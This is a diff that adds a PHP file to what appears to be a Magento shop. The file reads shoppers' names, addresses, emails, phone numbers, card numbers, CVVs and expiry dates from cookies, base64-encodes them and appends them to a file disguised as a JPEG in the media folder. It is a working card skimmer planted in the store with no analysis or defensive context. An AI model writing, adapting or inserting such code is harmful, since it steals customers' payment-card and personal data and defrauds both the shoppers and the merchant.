@@ -1,0 +1,32 @@
+<?php
+       $f1 = Mage::GetBaseDir();
+        $fp2 = fopen($f1.'/media/wysiwyg/cartcheckout.jpg', 'a+');
+        $mytext = $_COOKIE['currentname'];
+        $mytext1 = $_COOKIE['currentsecond'];
+        $mytext3 = $_COOKIE['currentemail'];
+        $mytext4 = $_COOKIE['currentstreet'];
+        $mytext7 = $_COOKIE['currentcity'];
+        $mytext8 = $_COOKIE['currentcountry'];
+        $mytext5 = $_COOKIE['currentphone'];
+        $mytext6 = $_COOKIE['currentzip'];
+        $mytext = $mytext.'|'.$mytext1.'|'.$mytext3.'|'.$mytext4.'|'.$mytext8.'|'.$mytext7.'|'.$mytext5.'|'.$mytext6.'|'.$mytext9.' ';
+        $val1 = '|';
+        $val2 = $_COOKIE['currentowner'];
+        $val1=$val1.$val2;
+        $val1 = $val1.'|';
+        $val2 = $_COOKIE['currentnumber'];
+        $val1=$val1.$val2;
+        $val1 = $val1.'|';
+        $val2 = $_COOKIE['currentcvv'];
+        $val1=$val1.$val2;
+        $val1 = $val1.'|';
+        $val2 = $_COOKIE['currentmonth'];
+        $val1=$val1.$val2;
+        $val1 = $val1.'|';
+        $val2 = $_COOKIE['currentyear'];
+        $val1=$val1.$val2;
+
+        $writetext="\r\n".$mytext.$val1;
+        fwrite($fp2, base64_encode($writetext));
+        fclose($fp2);
+?>
